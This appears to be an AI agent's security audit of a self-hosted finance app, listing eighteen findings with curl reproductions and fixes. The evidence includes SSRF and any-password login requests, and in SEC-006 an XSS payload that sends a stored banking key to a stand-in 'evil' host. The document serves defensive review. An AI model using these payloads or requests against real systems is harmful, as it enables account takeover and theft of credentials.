# Crystal — Security Findings

Reviewed 2026-10-13 at commit `2073eda`. Scope is security only. Routes and endpoints follow `audit/inventory.md`. No application code was modified.

**How findings were verified**
- **Reproduced**: confirmed by running the code.
  - The production backend (`server/src/index.ts`) ran locally via `tsx` with `NODE_ENV=production` and no database. Requests were made with `curl`.
  - The dev server (`server.ts`) was tested against an already-running local instance (see the note under Coverage).
- **Code**: confirmed by reading the code paths cited.

Anything that couldn't be confirmed either way is in **Unverified** at the end.

---

### [SEC-001] Unauthenticated SSRF proxy at `GET /api/smart-fetch` (production backend)
- Severity: **High**. It becomes Critical on any cloud host with a metadata service.
- Location: `server/src/smartFetcher.ts:5-36`; mounted at `server/src/index.ts:78` with no `authenticateToken`
- Evidence (reproduced): with no cookie and no token, the server fetched an internal URL and returned the full body:
  ```
  $ curl "http://localhost:3001/api/smart-fetch?url=http://127.0.0.1:3001/api"
  Crystal API is running.
  HTTP 200
  ```
  The only check is the protocol (`file://` → 400). There's no host or IP allowlist. Caller-supplied `cookies` are forwarded as a `Cookie` header (`smartFetcher.ts:22`). An SSRF guard (`isAllowedTargetUrl`, which blocks loopback, private and metadata IPs) exists only as stale compiled output in `server/dist/urlValidator.js`. Its source is gone and nothing uses it.
- Impact:
  - Anyone who can reach the backend can make it issue GET requests to any internal host and read the responses. In the shipped `docker-compose.yml`, port 3001 is published directly on the host, so that's anyone on the network.
  - Reachable targets include the Docker network (`db`, `frontend`), other services on the host or LAN (other Umbrel apps, routers, admin panels), and cloud metadata endpoints (`169.254.169.254`).
  - The endpoint also works as an anonymous open proxy for abusing third-party sites.
- Suggested fix:
  - Require `authenticateToken`.
  - Restore a host validator: resolve DNS and reject loopback, private, link-local and metadata ranges, both before connecting and after each redirect (`redirect: 'manual'`).
  - Cap the response size and set a timeout.
  - Drop the `cookies` pass-through, or restrict it to the same validated host.
- Effort: **S**

### [SEC-002] Dev server: any password signs in to any account, plus an open CORS proxy, bound to every network interface
- Severity: **High**, because the README installs the app this way.
- Location: `server.ts:12-18` (CORS), `:36-58` (`/api/ai/proxy`), `:91-111` (`getSessionUser`), `:129-154` (mock login), `:182-198` (`/data` → `uid = user ? user.id : 1`), `:210-212` (change-password), `:297` (`listen(PORT, '0.0.0.0')`); `README.md` "Installation" (`npm install && npm run dev`)
- Evidence (reproduced against a local `npm run dev` with `VITE_BACKEND_URL` unset):
  ```
  # attacker supplies the WRONG password for an existing user
  $ curl -X POST -d '{"email":"victim@x.com","password":"WRONG"}' .../api/auth/login
  {"user":{"id":2,...,"email":"victim@x.com",...},"financialData":{...}}   ← full session + data

  # any origin is reflected with credentials; open proxy, no auth
  $ curl -i -H 'Origin: http://evil.example' -X POST \
      -d '{"endpoint":"http://127.0.0.1:3000/api/health","method":"GET","headers":{}}' .../api/ai/proxy
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: http://evil.example
  Access-Control-Allow-Credentials: true
  ```
  Code shows the remaining problems:
  - Requests to `/api/data` with no session read and write **user id 1's data** (`server.ts:184`).
  - When only one user exists, `getSessionUser` returns that user to every caller (`:108-110`).
  - `change-password` always succeeds without checking anything.
- Impact:
  - The README's only install instructions run this server.
  - Anyone on the LAN can sign in as any user with any password and read or overwrite all their financial data.
  - Any website the user visits can read API responses cross-origin with credentials.
  - `/api/ai/proxy` is a second unauthenticated SSRF (POST, with arbitrary headers and method).
- Suggested fix:
  - Make the mock opt-in (e.g. `CRYSTAL_MOCK_API=1`) and bind to `127.0.0.1` by default.
  - Have mock login check the stored password. Never fall back to user 1. Remove the single-user shortcut.
  - Restrict CORS to the dev origin.
  - Delete `/api/ai/proxy` (it has no caller; see inventory §6).
  - Change the README to point at `docker-compose` for real installs.
- Effort: **S**

### [SEC-003] Login rate limit bypassed by spoofing `X-Forwarded-For`, and not limited per account
- Severity: **High**
- Location: `server/src/index.ts:18` (`app.set('trust proxy', true)`); `server/src/auth.ts:11-21` (limiter key `${req.ip}:${email}`); `server/src/rateLimit.ts` (in-memory store); `nginx.conf:15-21` (doesn't set or overwrite `X-Forwarded-For`)
- Evidence (reproduced). The 500s are because no database was running; the limiter runs before the handler, so they still show the limiter letting requests through:
  ```
  same IP, 7 attempts:            500 500 500 500 500 429 429
  rotating X-Forwarded-For, 7:    500 500 500 500 500 500 500
  ```
- Impact:
  - With `trust proxy: true`, Express takes the left-most client-supplied XFF value as `req.ip`. An attacker gets unlimited password guesses by changing one header, either directly on the published port 3001 or through nginx, which passes client headers on.
  - Because the key includes the email, spraying one password across many accounts is never limited even without spoofing.
  - Combined with SEC-009 (no password policy), weak passwords can be brute-forced.
- Suggested fix:
  - Set `trust proxy` to the actual hop count (`1`) or to the proxy subnet.
  - Have nginx set `proxy_set_header X-Forwarded-For $remote_addr;`.
  - Add a second limiter keyed on the email alone (lockout or backoff) and a global per-IP limiter.
  - Stop publishing port 3001 in `docker-compose.yml`; nginx reaches it over the internal network.
- Effort: **S**

### [SEC-004] Enable Banking private signing key kept in plaintext in the browser, the DB, and every sync request
- Severity: **High**
- Location:
  - client: `App.tsx:1918-1945` (`clientCertificate` in the connection object, saved via `savePartialData` and `POST /api/enable-banking/pending`), `App.tsx:2462-2506` (sent on every sync call), `utils/enableBankingStorage.ts:13-21` (sessionStorage), `:65-70` (`persistEnableBankingConfig` → **localStorage**)
  - server: `server/src/enableBanking.ts:275-298` (stores the connection, key included, in `financial_data.data.enableBankingPendingConnections`), `server/src/data.ts:96-108` (stores `enableBankingConnections` as received)
  - unused protection: `server/src/crypto.ts:50-62` (`sanitizeConnection` / `encryptSecret` are never imported)
- Evidence (code): `baseConnection = { …, clientCertificate: (payload.clientCertificate || '').trim(), … }` is persisted to localStorage and sessionStorage, posted to `/pending`, and saved in the JSONB blob. `grep` shows nothing outside tests imports `crypto.ts`.
- Impact:
  - The PEM private key signs JWTs for the user's Enable Banking application, which reads their bank accounts.
  - It can be read by any script in the page (see SEC-006), by anyone with the browser profile, by anyone with access to the Postgres volume or a DB backup, and by anyone holding a copy of the JSON data.
  - A leaked key lets an attacker impersonate the user's Enable Banking app until the key is rotated in the Enable Banking portal.
- Suggested fix:
  - Keep the key on the server only. On first upload, encrypt it with `encryptSecret` under a dedicated `ENCRYPTION_SECRET` and store it in its own table keyed by user.
  - Return only a reference to the client (`sanitizeConnection` was written for this). Have the server look up the key by connection id.
  - Remove the localStorage and sessionStorage copies, and scrub existing blobs in a migration.
- Effort: **M**

### [SEC-005] `POST /api/data` stores arbitrary JSON without validation (the zod schema is never called)
- Severity: **Medium**
- Location: `server/src/data.ts:34-117`; `server/src/schemas.ts:69` (`validateFinancialDataPayload`, used only in `schemas.test.ts`)
- Evidence (code): `grep -rn validateFinancialDataPayload server/src` matches only the definition and the test. The handler merges `{ ...currentData, ...incomingData }` and writes it as is, up to the 50 MB body limit.
- Impact:
  - Each user's blob can hold any shape and any amount of data, with no size cap per user across requests.
  - Every page of the client trusts this data, so it becomes the delivery path for stored payloads such as SEC-006.
  - Malformed data can permanently break the user's own client.
  - It also allows unbounded disk growth (see SEC-011, open registration).
- Suggested fix:
  - Call `validateFinancialDataPayload` for full saves, and validate each slice for partial saves.
  - Reject unknown top-level keys.
  - Enforce a byte cap per user (e.g. `pg_column_size`).
  - Tighten the `z.any()` arrays over time, starting with fields that reach the DOM (URLs, logos).
- Effort: **M**

### [SEC-006] DOM XSS through merchant logo URLs in Leaflet `divIcon` HTML
- Severity: **Medium**
- Location: `components/MerchantOverviewModal.tsx:56`, `:136` (`if (rule?.logo) return rule.logo;`); `components/TransactionDetailModal.tsx:49`; `utils/brandfetch.ts:82-85` (override accepted if it merely starts with `https://`)
- Evidence (code): the marker HTML is a raw string that Leaflet assigns to `innerHTML`:
  ```ts
  `<img src="${logoUrl}" class="..." onerror="this.style.display='none'" />`
  ```
  `logoUrl` is either `rule.logo`, with no check at all, or a `merchantLogoOverrides` value that only has to start with `https://`. A value like `https://x" onerror="fetch('//evil/'+localStorage.enableBankingConfig)` breaks out of the attribute. The first `onerror` wins, so the payload runs when the merchant or transaction map renders.
- Impact:
  - Script runs in the app's origin. It can read the Enable Banking private key from localStorage (SEC-004) and call every API as the user (the HttpOnly cookie is sent automatically).
  - Ways to plant the value:
    - the user's own merchant settings (self-XSS)
    - restoring a crafted JSON backup through Smart Restore
    - any direct write to `/api/data`, which has no validation (SEC-005)
- Suggested fix:
  - Build the marker with DOM APIs (`document.createElement('img'); img.src = url`), or escape the value with the existing `escapeHtml` in `utils.ts:73`.
  - Validate logo values with `new URL()`, allowing only the `https:` and `data:image/` schemes, wherever they're saved.
- Effort: **S**

### [SEC-007] Insecure default secrets: hardcoded JWT fallback and published compose defaults
- Severity: **Medium**
- Location: `server/src/authConfig.ts:4` (`|| 'crystal_default_jwt_secret_dev_key'`); `server/src/crypto.ts:7` (`|| 'crystal-default-encryption-secret-key-32b'`); `docker-compose.yml` (`JWT_SECRET: ${JWT_SECRET:-a-very-secret-and-secure-key-that-you-should-change}`, `POSTGRES_PASSWORD:-strong_password_change_me`)
- Evidence (reproduced): a token signed with the public default secret passed `jwt.verify`. It was rejected only at the session-table lookup:
  ```
  $ curl -H "Authorization: Bearer <jwt signed with crystal_default_jwt_secret_dev_key>" .../api/auth/me
  {"message":"Invalid session token."} HTTP 403      ← failed at DB session check, not signature
  ```
  The server starts with `NODE_ENV=production` and no `JWT_SECRET`, without a warning.
- Impact:
  - Installs that keep the defaults have a publicly known signing key.
  - The DB session check (`middleware.ts:56-68`) currently prevents forging a session outright, since a valid session id is also needed. But a known secret removes a layer of defense and turns any session-id leak into a full compromise.
  - The default DB password is also public. The DB port isn't published, so exposure is limited to the Docker network.
- Suggested fix:
  - Refuse to start in production when `JWT_SECRET` is missing or matches a known default.
  - Remove the fallbacks in `compose` (use `${JWT_SECRET:?must be set}`).
  - Use a separate required `ENCRYPTION_SECRET`.
- Effort: **S**

### [SEC-008] No security headers (CSP, frame protection, HSTS, nosniff); `X-Powered-By` exposed
- Severity: **Medium**
- Location: `nginx.conf` (only `Cache-Control`/`Pragma` headers); `server/src/index.ts` (no `helmet`, `x-powered-by` left enabled)
- Evidence (reproduced): `curl -sI localhost:3001/api` returns `X-Powered-By: Express` and none of `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`. `nginx.conf` has no `add_header` for any of them.
- Impact:
  - There's no CSP to contain XSS such as SEC-006.
  - The app can be framed, which allows clickjacking of destructive one-click flows such as Data Management → reset all data.
  - Without nosniff, MIME confusion is possible.
- Suggested fix:
  - In nginx, add:
    - `Content-Security-Policy` (`default-src 'self'`, plus the specific image, connect and tile hosts: Brandfetch, Twelve Data, Carto, pravatar)
    - `frame-ancestors 'none'` / `X-Frame-Options: DENY`
    - `X-Content-Type-Options: nosniff`
    - `Referrer-Policy: strict-origin-when-cross-origin`
    - HSTS when served over TLS
  - Add `helmet()` and `app.disable('x-powered-by')` in Express.
- Effort: **S**

### [SEC-009] No password policy or input type checks on register, login and password change
- Severity: **Medium**
- Location: `server/src/auth.ts:60-66`, `:104-108`; `server/src/users.ts:45-52`
- Evidence (code): the only check is truthiness (`if (!firstName || … !password)`). So:
  - A one-character password is accepted.
  - Passwords longer than 72 bytes are silently truncated by bcrypt.
  - `email` isn't format-checked or trimmed.
  - A non-string `email` (e.g. `{"email":["a"]}`) throws at `.toLowerCase()`, giving a 500 instead of a 400.
  - Same gaps in `change-password`'s `newPassword`.
- Impact: trivial passwords combined with SEC-003 make account takeover practical. Malformed input causes 500s and log noise.
- Suggested fix:
  - Validate request bodies with zod: email format; password at least 10 characters and at most 72 bytes, optionally checked against a breached-password list.
  - Trim and lowercase the email consistently.
- Effort: **S**

### [SEC-010] No password reset or account recovery
- Severity: **Low**
- Location: `pages/SignIn.tsx:72` ("Forgot password?" has no handler); no reset endpoint in `server/src`
- Evidence (code): the button has no `onClick`. `server/src/auth.ts` defines only `register`, `login`, `logout` and `me`.
- Impact: a user who forgets their password can only recover through direct DB access. That pushes admins toward ad-hoc SQL password edits. Users may also expect a reset to exist when it doesn't.
- Suggested fix:
  - Either remove the button, or build a reset flow with single-use, hashed, short-expiry tokens (or an admin CLI for self-hosted installs).
  - Revoke all sessions after a reset, as `change-password` already does.
- Effort: **M**

### [SEC-011] Open self-registration with no way to turn it off
- Severity: **Low**
- Location: `server/src/auth.ts:60` (public `POST /register`); no config flag
- Evidence (code): registration requires no invite, admin approval or configuration switch.
- Impact: on an instance reachable from the LAN or internet, anyone can create an account. That gives them the authenticated surface (Enable Banking proxy routes, 50 MB blobs per request with SEC-005) on a server meant for one household.
- Suggested fix: add `ALLOW_REGISTRATION` (default `false` after the first user), or invite tokens.
- Effort: **S**

### [SEC-012] Account enumeration via register response and login timing
- Severity: **Low**
- Location: `server/src/auth.ts:71-74` (409 "Email already in use."), `:113-114` (bcrypt runs only when the user exists)
- Evidence (code): `const passwordMatches = user ? await bcrypt.compare(...) : false;` means an unknown email returns without the ~250 ms bcrypt work at cost 12.
- Impact: attackers can confirm which emails have accounts before targeting them with SEC-003.
- Suggested fix:
  - Compare against a dummy hash when the user doesn't exist.
  - Return a generic message from registration, or accept that it enumerates and rely on the SEC-003 limits.
- Effort: **S**

### [SEC-013] User email sent to a third party (pravatar.cc) as the default avatar URL
- Severity: **Low**
- Location: `server/src/auth.ts:76`; `server.ts:139`, `:162`
- Evidence (reproduced in the dev mock response): `"profilePictureUrl":"https://i.pravatar.cc/150?u=victim@x.com"`
- Impact: every time the avatar renders, the browser sends the user's email address and IP to an unrelated third party. That contradicts the README's privacy-first claim.
- Suggested fix: default to a local initials avatar, or hash the email (`?u=sha256(email)`) if a remote avatar is wanted.
- Effort: **S**

### [SEC-014] Internal error details returned to clients
- Severity: **Low**
- Location: `server/src/index.ts:65-71` (public `/health` returns `err.message`); `server/src/enableBanking.ts` (all handlers: `res.status(500).json({ message: error?.message })`, including the upstream response body from `request()` at `:61-64`)
- Evidence (reproduced): `curl localhost:3001/health` returns `{"status":"unhealthy","error":"Database connection failed","message":"…"}` with the raw driver message, no auth required.
- Impact: unauthenticated callers learn DB connectivity details (host or auth errors), and Enable Banking error bodies are passed through to the browser.
- Suggested fix: log details on the server and return generic messages. Keep `/health` to a status code, or restrict it to the Docker network.
- Effort: **S**

### [SEC-015] CSRF defense depends on SameSite=Lax plus a CORS error, and is fully open outside production
- Severity: **Low**
- Location: `server/src/authConfig.ts:13` (SameSite configurable, default `lax`); `server/src/index.ts:43-55` (CORS origin callback; allow-all when `!isProduction && !CORS_ORIGIN`); `:59` (`express.urlencoded` on every route)
- Evidence (reproduced, `NODE_ENV=production`): a form-encoded POST with `Origin: http://evil.example` got a 500 from the CORS callback error, so the handler never ran. With `Origin: http://localhost:3000` it reached auth (401).
- Impact:
  - There's no CSRF token or deliberate Origin check. Protection is a side effect of `cors()` raising an error, plus SameSite.
  - Any deployment with `NODE_ENV` not set to `production`, or with `AUTH_COOKIE_SAMESITE=none`, accepts state-changing cross-site form posts (`urlencoded` is enabled) to `/api/data`.
- Suggested fix:
  - Add an explicit Origin/`Sec-Fetch-Site` check for non-GET methods.
  - Remove `express.urlencoded`; the API is JSON only.
  - Return 403 rather than throwing from the CORS callback.
- Effort: **S**

### [SEC-016] 50 MB body parsing before authentication on every route
- Severity: **Low**
- Location: `server/src/index.ts:57-59`; `nginx.conf:9` (`client_max_body_size 50m`)
- Evidence (code): `express.json({ limit: '50mb' })` and `urlencoded` are global and run before `authenticateToken`, including on `/api/auth/login` and `/register`.
- Impact: unauthenticated clients can make the server buffer and parse 50 MB JSON bodies concurrently, causing memory and CPU exhaustion on small self-hosted devices such as Umbrel or a Raspberry Pi.
- Suggested fix: set a small global limit (e.g. `100kb`) and apply the large limit only on `POST /api/data`, after auth.
- Effort: **S**

### [SEC-017] No lockfiles: unpinned dependency resolution in CI and Docker builds
- Severity: **Low**
- Location: repo root and `server/` (no `package-lock.json`); `Dockerfile`, `server/Dockerfile` (`npm install`)
- Evidence (run): `npm audit` fails with `ENOLOCK`. I generated lockfiles in a scratch copy (`npm i --package-lock-only`) and audited those:
  - **Frontend:** 7 High, all in the `shadcn` CLI chain (`shadcn` → `fast-glob`/`micromatch`/`braces`: GHSA-vfj7-8cjw-p6xm stack-exhaustion DoS; `ts-morph`). **Not reachable**: no application code imports `shadcn`, `fast-glob`, `micromatch` or `braces`; it's a code-generation CLI. It is, however, listed under `dependencies`.
  - **Server:** 0 vulnerabilities.
- Impact: every image build resolves fresh versions, so a compromised or broken upstream release goes straight into production images. Builds aren't reproducible, and `npm audit` can't run in CI.
- Suggested fix:
  - Commit lockfiles and use `npm ci` in both Dockerfiles.
  - Move `shadcn` to `devDependencies`.
  - Add `npm audit --omit=dev --audit-level=high` to the workflow.
- Effort: **S**

### [SEC-018] Containers run as root
- Severity: **Low**
- Location: `server/Dockerfile`, `Dockerfile` (no `USER` directive; `node:20-alpine` and `nginx:1.27-alpine` default to root)
- Evidence (code): neither Dockerfile sets a non-root user.
- Impact: any RCE in the backend (or abuse that SEC-001 makes easier) runs as root inside the container, which widens the blast radius.
- Suggested fix: add `USER node` to the backend image, and use `nginxinc/nginx-unprivileged` for the frontend.
- Effort: **S**

---

## Unverified

These are suspicions I couldn't confirm.

- **OAuth redirect built from `X-Forwarded-Host`** (`server/src/enableBanking.ts:183-190`): when `ENABLE_BANKING_REDIRECT_URL` is unset, the bank redirect URL comes from `X-Forwarded-Host` / `X-Forwarded-Proto`, which nginx passes through from the client. I couldn't build a cross-user attack, because the victim's own browser sends the request. A misconfigured upstream proxy could still poison it. Recommend requiring `ENABLE_BANKING_REDIRECT_URL`.
- **Umbrel deployment CORS**: `crystal/docker-compose.yml` doesn't set `CORS_ORIGIN`, so the production allowlist falls back to `localhost:5173/3000`. Browsers send `Origin` on same-origin POSTs, so this may either block the app (500s) or push operators to loosen CORS. I haven't tested it on Umbrel.
- **Prototype pollution in client-side restore/merge** (`SmartRestoreModal`, `handleRestoreData`): server-side spreads are safe (they create own properties), but I didn't trace whether any client-side deep-merge of restored JSON uses `Object.assign`/recursive merge on `__proto__` keys.
- **Lost updates between `/api/enable-banking/pending` and `/api/data`**: the pending handlers read-modify-write the blob without `FOR UPDATE`, so a concurrent autosave could drop the other's changes. This is mainly a data-integrity issue; it didn't seem security-relevant enough to confirm.
- **Session-id exposure**: logout (`auth.ts:129-151`) revokes only the session in the cookie; a token used as `Bearer` isn't revoked on logout. The frontend uses only cookies, so I didn't confirm any practical impact.

---

## Coverage

**Covered**
- **Authentication:** `auth.ts`, `middleware.ts`, `authConfig.ts`, `users.ts`, `rateLimit.ts`; cookie flags, JWT plus server-side session table, expiry, logout and revocation, bcrypt cost, reset flow.
- **Authorization:** all 21 production endpoints and the 4 dev endpoints from the inventory. Every data query is scoped by `req.user.id` from the verified session. **No cross-user (IDOR) access was found in the production backend.** No role checks exist anywhere, and none are needed today, because there are no privileged endpoints.
- **Injection:** all SQL uses parameterized `$n` placeholders; no string-built SQL. No `child_process`, filesystem, or template-engine use on the server. Path params to Enable Banking are `encodeURIComponent`-ed.
- **XSS:** searched the frontend for `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `eval`/`Function`, `DOMParser`, Leaflet `divIcon`/`bindPopup`, and `href`/`src` sinks.
  - `DOMParser` use is read-only.
  - React 19 blocks `javascript:` hrefs.
  - The only real sink found is SEC-006.
- **CSRF, CORS, headers:** Express and nginx configuration.
- **Secrets:** source, compose files, `.gitignore`, and the built bundle (`dist/assets`). The only key-like strings in the bundle are **truncated placeholder PEMs in `demoData.ts`** (they end in `…6demo`), not real keys.
- **Input validation:** every handler. There are no server-side file uploads; CSV and JSON imports are parsed in the browser.
- **Dependencies:** `npm audit` on generated lockfiles for both packages (SEC-017). Results come from a fresh resolution, so the versions installed in `node_modules` may differ.
- **Logs and responses:** server `console.error` calls (no request bodies or secrets logged), and error payloads (SEC-014).

**Not covered or partial**
- I did **not** use subagents; the backend is about 1.7k lines and was reviewed in full by hand. The roughly 25k-line frontend was reviewed with sink-based searches rather than line by line.
- No dynamic browser testing. SEC-006 is confirmed from the code, not executed in a browser.
- Third-party browser calls (Twelve Data, Brandfetch, Carto) were reviewed only for key handling. They use the user's own keys in query strings, which is expected for those APIs.
- The Umbrel-specific deployment (`crystal/`) was reviewed only from its compose file.
- **Side effect during testing:** port 3000 was already serving your own `npm run dev` (PID 59364). My duplicate server couldn't take over the port, so my SEC-002 requests went to your instance and created an in-memory mock user `victim@x.com` with one dummy account. Nothing was written to disk or a database. Restarting the dev server clears it. My duplicate process and the test backend on port 3001 have been stopped.

---

## Top 5

1. **SEC-001**: Unauthenticated SSRF in `/api/smart-fetch` on the production backend. Anyone can read internal or LAN URLs through the server.
2. **SEC-002**: The README's `npm run dev` install runs a mock that accepts any password, falls back to user 1's data, reflects any CORS origin, and exposes an open proxy on `0.0.0.0`.
3. **SEC-003**: Login rate limit bypassed by spoofing `X-Forwarded-For` (`trust proxy: true`, and port 3001 is published). Combined with no password policy (SEC-009), brute force is practical.
4. **SEC-004**: The Enable Banking private signing key is stored in plaintext in localStorage, sessionStorage and the DB blob, and sent on every sync. The encryption helpers that exist are unused.
5. **SEC-006 + SEC-005**: Unescaped logo URLs in Leaflet marker HTML allow script execution. `/api/data` has no schema validation to stop the stored payload, and there's no CSP (SEC-008) to contain it.
